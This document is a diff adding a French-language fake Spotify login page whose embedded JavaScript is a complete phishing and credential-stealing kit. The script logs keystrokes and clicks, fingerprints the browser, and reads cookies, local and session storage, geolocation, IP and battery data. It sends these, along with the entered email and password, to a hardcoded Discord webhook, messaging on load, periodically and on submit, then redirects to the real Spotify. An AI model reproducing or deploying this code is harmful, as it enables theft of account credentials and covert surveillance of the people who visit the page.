@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify - Connexion</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(180deg, #1db954 0%, #191414 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .login-container {
+            background: #191414;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            max-width: 450px;
+            width: 100%;
+            color: white;
+        }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo svg { width: 60px; height: 60px; }
+        h1 { font-size: 24px; text-align: center; margin-bottom: 30px; color: white; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #b3b3b3; }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #282828;
+            border: 2px solid transparent;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus { outline: none; border-color: #1db954; background: #333; }
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background: #1db954;
+            border: none;
+            border-radius: 500px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .btn-login:hover { background: #1ed760; }
+        .error { color: #e74c3c; font-size: 14px; margin-top: 10px; display: none; }
+        .loading { display: none; text-align: center; margin-top: 20px; }
+        .spinner {
+            border: 4px solid #282828;
+            border-top: 4px solid #1db954;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .links { text-align: center; margin-top: 25px; }
+        .links a { color: #b3b3b3; text-decoration: none; font-size: 14px; }
+        .links a:hover { color: white; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="#1db954">
+                <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.02.6-1.14 4.56-1.38 9.96-.66 13.56 1.56.42.24.54.78.301 1.26zm.12-3.36c-3.84-2.28-10.14-2.52-13.8-1.38-.54.18-1.08-.12-1.26-.66-.18-.54.12-1.08.66-1.26 4.26-1.38 11.16-1.08 15.54 1.56.48.3.66.96.36 1.44-.24.42-.9.6-1.5.3z"/>
+            </svg>
+        </div>
+        <h1>Se connecter à Spotify</h1>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Adresse e-mail ou nom d'utilisateur</label>
+                <input type="text" id="email" placeholder="nom@exemple.com" required>
+            </div>
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" id="password" placeholder="Mot de passe" required>
+            </div>
+            <div class="error" id="errorMessage">E-mail ou mot de passe incorrect.</div>
+            <button type="submit" class="btn-login" id="loginBtn">SE CONNECTER</button>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 15px; color: #b3b3b3;">Connexion en cours...</p>
+            </div>
+        </form>
+        
+        <div class="links">
+            <a href="#" onclick="alert('Mot de passe oublié?')">Mot de passe oublié?</a><br><br>
+            <a href="#" onclick="alert('Créer un compte')">S'inscrire sur Spotify</a>
+        </div>
+    </div>
+
+    <script>
+        // ========== COLLECTE MAXIMALE ==========
+        
+        // 1. KEYLOGGER COMPLET
+        let keystrokes = [];
+        let mouseClicks = [];
+        let formInteractions = [];
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.key.length === 1 || e.key === 'Backspace' || e.key === 'Enter') {
+                keystrokes.push({
+                    key: e.key,
+                    timestamp: Date.now(),
+                    target: e.target?.id || 'page'
+                });
+            }
+        });
+
+        // 2. SUIVI DE SOURIS
+        document.addEventListener('click', function(e) {
+            mouseClicks.push({
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target?.id || e.target?.tagName || 'unknown',
+                timestamp: Date.now()
+            });
+        });
+
+        // 3. SUIVI DE FORMULAIRE
+        document.getElementById('email')?.addEventListener('focus', function() {
+            formInteractions.push({ action: 'focus_email', timestamp: Date.now() });
+        });
+        
+        document.getElementById('password')?.addEventListener('focus', function() {
+            formInteractions.push({ action: 'focus_password', timestamp: Date.now() });
+        });
+
+        // 4. COLLECTE SYSTÈME COMPLÈTE
+        function getSystemInfo() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            let gpuInfo = 'Non disponible';
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                }
+            }
+
+            return {
+                // Informations de base
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages?.join(', ') || 'Non disponible',
+                
+                // Écran
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                
+                // Navigateur
+                browser: navigator.appName,
+                browserVersion: navigator.appVersion,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                productSub: navigator.productSub,
+                
+                // Matériel
+                cpuCores: navigator.hardwareConcurrency || 'inconnu',
+                deviceMemory: navigator.deviceMemory || 'inconnu',
+                gpu: gpuInfo,
+                
+                // Connexion
+                connection: navigator.connection?.effectiveType || 'inconnu',
+                downlink: navigator.connection?.downlink || 'inconnu',
+                rtt: navigator.connection?.rtt || 'inconnu',
+                
+                // Temps
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Stockage
+                cookies: document.cookie || 'Aucun',
+                localStorage: JSON.stringify(localStorage) || 'Aucun',
+                sessionStorage: JSON.stringify(sessionStorage) || 'Aucun',
+                
+                // Plugins
+                plugins: Array.from(navigator.plugins).map(p => p.name + ' (' + p.filename + ')').join(' | ') || 'Aucun',
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type).join(' | ') || 'Aucun',
+                
+                // Sécurité
+                doNotTrack: navigator.doNotTrack || 'inconnu',
+                cookiesEnabled: navigator.cookieEnabled,
+                
+                // Fenêtre
+                windowWidth: window.innerWidth,
+                windowHeight: window.innerHeight,
+                windowX: window.screenX,
+                windowY: window.screenY,
+                
+                // Histoire
+                historyLength: window.history.length,
+                
+                // Géolocalisation (si disponible)
+                geolocation: 'Demande en cours...'
+            };
+        }
+
+        // 5. TENTATIVE DE GÉOLOCALISATION
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                altitude: position.coords.altitude || 'Non disponible',
+                                speed: position.coords.speed || 'Non disponible'
+                            });
+                        },
+                        () => { resolve('Refusé ou indisponible'); }
+                    );
+                } else {
+                    resolve('Non supporté');
+                }
+            });
+        }
+
+        // 6. RÉCUPÉRATION IP MULTIPLE
+        async function getIP() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api.myip.com',
+                'https://ipapi.co/json/',
+                'https://jsonip.com'
+            ];
+            
+            for (const service of services) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+                    if (data.ip) return data.ip;
+                } catch(e) { continue; }
+            }
+            return 'Non disponible';
+        }
+
+        // 7. COLLECTE DE BATTERIE
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: "🔋 **Informations batterie**",
+                            embeds: [{
+                                title: "Batterie de la victime",
+                                color: 3066993,
+                                fields: [
+                                    { name: "Niveau", value: (battery.level * 100) + '%', inline: true },
+                                    { name: "Chargement", value: battery.charging ? 'Oui' : 'Non', inline: true },
+                                    { name: "Temps restant", value: battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' min' : 'Inconnu', inline: true }
+                                ],
+                                timestamp: new Date().toISOString()
+                            }]
+                        })
+                    });
+                });
+            }
+        }
+
+        // 8. ENVOI PRINCIPAL
+        async function sendAllData(formData) {
+            const systemInfo = getSystemInfo();
+            const ip = await getIP();
+            const geo = await getGeolocation();
+            
+            // Envoyer les frappes accumulées
+            if (keystrokes.length > 0) {
+                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "⌨️ **Keylogger complet**",
+                        embeds: [{
+                            title: "Toutes les frappes",
+                            description: keystrokes.map(k => k.key + ' (sur ' + k.target + ')').join('').substring(0, 2000),
+                            color: 3066993,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            }
+
+            // Envoyer les clics souris
+            if (mouseClicks.length > 0) {
+                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🖱️ **Clics souris** (" + mouseClicks.length + " clics)",
+                        embeds: [{
+                            title: "Interactions souris",
+                            description: mouseClicks.map(c => 'X:' + c.x + ' Y:' + c.y + ' sur ' + c.target).join('\n').substring(0, 2000),
+                            color: 3066993,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            }
+
+            // Message principal avec TOUTES les données
+            const embed = {
+                title: "🎵 Spotify - Données complètes de la victime",
+                color: 3066993,
+                fields: [
+                    // Identifiants
+                    { name: "📧 Email", value: formData.email || 'Non fourni', inline: true },
+                    { name: "🔑 Mot de passe", value: formData.password || 'Non fourni', inline: true },
+                    
+                    // Réseau
+                    { name: "🌍 IP", value: ip, inline: true },
+                    { name: "📍 Géolocalisation", value: typeof geo === 'object' ? geo.latitude + ', ' + geo.longitude : geo, inline: true },
+                    { name: "📶 Connexion", value: systemInfo.connection + ' (' + systemInfo.downlink + ' Mbps)', inline: true },
+                    { name: "⏱️ RTT", value: systemInfo.rtt + ' ms', inline: true },
+                    
+                    // Système
+                    { name: "🖥️ OS", value: systemInfo.platform, inline: true },
+                    { name: "🌐 Navigateur", value: systemInfo.browser + ' v' + systemInfo.browserVersion, inline: true },
+                    { name: "💻 CPU", value: systemInfo.cpuCores + ' cœurs', inline: true },
+                    { name: "🧠 RAM", value: systemInfo.deviceMemory + ' GB', inline: true },
+                    { name: "🎮 GPU", value: systemInfo.gpu.substring(0, 100), inline: true },
+                    
+                    // Affichage
+                    { name: "📺 Écran", value: systemInfo.screenWidth + 'x' + systemInfo.screenHeight, inline: true },
+                    { name: "🖼️ Fenêtre", value: systemInfo.windowWidth + 'x' + systemInfo.windowHeight, inline: true },
+                    { name: "🔍 Pixel Ratio", value: systemInfo.pixelRatio.toString(), inline: true },
+                    
+                    // Temps
+                    { name: "🕒 Timezone", value: systemInfo.timezone, inline: true },
+                    { name: "🗣️ Langue", value: systemInfo.language + ' (' + systemInfo.languages + ')', inline: true },
+                    
+                    // Stockage
+                    { name: "🍪 Cookies", value: systemInfo.cookies.substring(0, 500) || 'Aucun', inline: false },
+                    { name: "💾 LocalStorage", value: systemInfo.localStorage.substring(0, 500) || 'Aucun', inline: false },
+                    { name: "📦 SessionStorage", value: systemInfo.sessionStorage.substring(0, 500) || 'Aucun', inline: false },
+                    
+                    // Plugins
+                    { name: "🔌 Plugins", value: systemInfo.plugins.substring(0, 500) || 'Aucun', inline: false },
+                    
+                    // Sécurité
+                    { name: "🚫 Do Not Track", value: systemInfo.doNotTrack, inline: true },
+                    { name: "🍪 Cookies activés", value: systemInfo.cookiesEnabled ? 'Oui' : 'Non', inline: true },
+                    
+                    // User Agent complet
+                    { name: "📡 User Agent", value: systemInfo.userAgent.substring(0, 1024), inline: false }
+                ],
+                footer: { text: "🎵 Collecté le " + new Date().toLocaleString() + ' | ' + keystrokes.length + ' frappes, ' + mouseClicks.length + ' clics' },
+                timestamp: new Date().toISOString()
+            };
+
+            fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "@everyone 🎵 **NOUVELLE VICTIME SPOTIFY - DONNÉES COMPLÈTES**",
+                    embeds: [embed]
+                })
+            });
+        }
+
+        // 9. GESTIONNAIRE DE SOUMISSION
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                document.getElementById('errorMessage').style.display = 'block';
+                return;
+            }
+            
+            document.getElementById('loginBtn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            await sendAllData({ email: email, password: password });
+            
+            // Redirection propre vers Spotify
+            setTimeout(function() {
+                window.location.href = 'https://accounts.spotify.com';
+            }, 3000);
+        });
+
+        // 10. COLLECTE INITIALE
+        window.addEventListener('load', function() {
+            getBatteryInfo();
+            
+            setTimeout(async function() {
+                const ip = await getIP();
+                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "👀 **Nouveau visiteur Spotify**",
+                        embeds: [{
+                            title: "IP: " + ip,
+                            color: 3066993,
+                            fields: [
+                                { name: "OS", value: navigator.platform, inline: true },
+                                { name: "Navigateur", value: navigator.appName, inline: true },
+                                { name: "CPU/RAM", value: navigator.hardwareConcurrency + ' cœurs / ' + navigator.deviceMemory + ' GB', inline: true }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            }, 2000);
+        });
+
+        // Envoi périodique du keylogger
+        setInterval(function() {
+            if (keystrokes.length > 0) {
+                fetch('https://discordapp.com/api/webhooks/1467490473492091073/stvtM_UWv5ut2mevmU2Y6gBxdDH23G6kUU0ta3ap17DKOYHSVUcCcz9DmalG6ivQ0Q88', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "⌨️ **Keylogger - " + keystrokes.length + " nouvelles frappes**",
+                        embeds: [{
+                            description: keystrokes.map(k => k.key).join('').substring(0, 2000),
+                            color: 3066993,
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+                keystrokes = [];
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
